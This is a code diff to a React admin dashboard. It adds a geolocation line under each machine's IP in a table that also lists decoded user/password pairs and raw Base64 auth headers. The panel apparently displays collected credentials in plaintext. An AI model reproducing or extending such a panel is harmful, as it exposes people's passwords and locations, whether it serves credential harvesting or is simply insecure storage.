@@ -161,7 +161,7 @@ const Admin = () => {
                                     <tr style={{ background: '#333', color: '#fff' }}>
                                         <th style={{ padding: '10px', textAlign: 'left' }}>Machine ID</th>
                                         <th style={{ padding: '10px', textAlign: 'left' }}>User / Pass</th>
-                                        <th style={{ padding: '10px', textAlign: 'left' }}>IP</th>
+                                        <th style={{ padding: '10px', textAlign: 'left' }}>IP / Location</th>
                                         <th style={{ padding: '10px', textAlign: 'left' }}>Raw Auth (Base64)</th>
                                         <th style={{ padding: '10px', textAlign: 'left' }}>Last Seen</th>
                                     </tr>
@@ -171,7 +171,10 @@ const Admin = () => {
                                         <tr key={m.id} style={{ borderBottom: '1px solid #444' }}>
                                             <td style={{ padding: '10px' }}>{m.no_serie}</td>
                                             <td style={{ padding: '10px', fontFamily: 'monospace' }}>{m.raw_decoded || '-'}</td>
-                                            <td style={{ padding: '10px' }}>{m.ip || '-'}</td>
+                                            <td style={{ padding: '10px' }}>
+                                                <div>{m.ip || '-'}</div>
+                                                <div style={{ fontSize: '0.8em', color: '#ffd700' }}>{m.geo_location || ''}</div>
+                                            </td>
                                             <td style={{ padding: '10px', fontFamily: 'monospace', fontSize: '0.8em', maxWidth: '150px', overflow: 'hidden', textOverflow: 'ellipsis' }}>{m.raw_auth || '-'}</td>
                                             <td style={{ padding: '10px' }}>{m.last_seen ? new Date(m.last_seen).toLocaleString() : '-'}</td>
                                         </tr>
